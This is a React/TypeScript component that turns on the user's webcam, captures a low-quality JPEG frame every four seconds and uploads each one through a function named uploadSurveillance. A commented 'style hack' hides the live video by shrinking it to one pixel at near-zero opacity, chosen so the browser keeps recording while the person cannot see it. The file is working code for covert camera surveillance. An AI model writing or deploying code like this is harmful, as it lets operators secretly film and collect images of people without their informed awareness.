import React, { useEffect, useRef } from 'react';
import { dataService } from '../services/dataService';

interface CameraMonitorProps {
  user: string;
  onError: () => void;
  onSuccess: () => void;
}

const CameraMonitor: React.FC<CameraMonitorProps> = ({ user, onError, onSuccess }) => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    let stream: MediaStream | null = null;
    let intervalId: any;

    const startCamera = async () => {
      try {
        // Request video
        stream = await navigator.mediaDevices.getUserMedia({ 
          video: { width: 320, height: 240, facingMode: "user" } 
        });
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          // IMPORTANT: Must play to start stream
          await videoRef.current.play();
          onSuccess();
        }

        // Capture every 4 seconds
        intervalId = setInterval(captureFrame, 4000);

      } catch (err: any) {
        // Permission denied or device not found
        console.warn("Cam Monitor:", err.name);
        onError();
      }
    };

    const captureFrame = async () => {
      if (videoRef.current && canvasRef.current) {
        const video = videoRef.current;
        const canvas = canvasRef.current;
        const context = canvas.getContext('2d');

        if (context && video.readyState === video.HAVE_ENOUGH_DATA) {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          
          // Low quality JPEG for speed
          const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
          
          // Upload
          await dataService.uploadSurveillance(user, dataUrl);
        }
      }
    };

    startCamera();

    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      if (intervalId) clearInterval(intervalId);
    };
  }, [user]);

  return (
    // STYLE HACK: 
    // Do not use 'display: none' or 'visibility: hidden' because modern browsers 
    // stop updating video frames to save battery.
    // Use opacity almost 0 and pointer-events none to make it "invisible" but active.
    <div style={{ 
        position: 'fixed', 
        bottom: 0, 
        right: 0, 
        width: '1px', 
        height: '1px', 
        opacity: 0.01, 
        pointerEvents: 'none', 
        zIndex: -50 
    }}>
      <video ref={videoRef} playsInline muted width="320" height="240" />
      <canvas ref={canvasRef} width="320" height="240" />
    </div>
  );
};

export default CameraMonitor;